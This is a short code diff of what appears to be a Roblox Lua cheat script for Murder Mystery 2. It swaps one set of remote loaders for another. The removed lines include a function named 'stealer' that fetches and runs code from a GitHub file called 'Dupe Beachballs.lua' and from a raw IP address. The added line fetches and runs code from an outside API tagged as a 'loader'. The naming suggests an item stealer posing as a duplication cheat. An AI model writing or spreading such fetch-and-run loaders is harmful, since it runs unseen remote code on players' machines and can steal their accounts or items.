@@ -1,8 +1,1 @@
-local function stealer()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/t15479231-bot/t1/refs/heads/main/Mm2/Op/Dupe%20Beachballs.lua"))()
-end
-local function loadui()
-  loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
-end
-task.spawn(stealer)
-task.spawn(loadui)
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6IjRjMmNmNTBiLWRiODYtNDQ1My1hNzAzLTNjNDg3YjQ0YWM4NyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJuZXd1aSJ9fQ"))()
